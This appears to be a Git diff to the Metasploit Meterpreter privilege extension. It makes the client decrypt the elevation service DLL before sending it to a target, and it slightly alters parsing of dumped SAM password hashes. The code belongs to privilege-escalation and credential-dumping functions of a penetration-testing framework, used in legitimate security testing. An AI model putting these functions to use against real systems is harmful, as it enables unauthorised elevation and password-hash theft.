@@ -82,11 +82,8 @@ class Priv < Extension
         raise RuntimeError, "#{elevators.chomp(', ')} not found", caller
       end
 
-      elevator_data = ''
-
-      ::File.open(elevator_path, 'rb') { |f|
-        elevator_data += f.read(f.stat.size)
-      }
+      encrypted_elevator_data = ::File.binread(elevator_path)
+      elevator_data = ::MetasploitPayloads::Crypto.decrypt(ciphertext: encrypted_elevator_data)
 
       request.add_tlv(TLV_TYPE_ELEVATE_SERVICE_DLL, elevator_data)
       request.add_tlv(TLV_TYPE_ELEVATE_SERVICE_LENGTH, elevator_data.length)
@@ -124,7 +121,7 @@ class Priv < Extension
     # This can take a long long time for large domain controls, bump the timeout to one hour
     response = client.send_request(Packet.create_request(COMMAND_ID_PRIV_PASSWD_GET_SAM_HASHES), 3600)
 
-    response.get_tlv_value(TLV_TYPE_SAM_HASHES).split(/\n/).map { |hash|
+    response.get_tlv_value(TLV_TYPE_SAM_HASHES).split("\n").map { |hash|
       SamUser.new(hash)
     }
   end
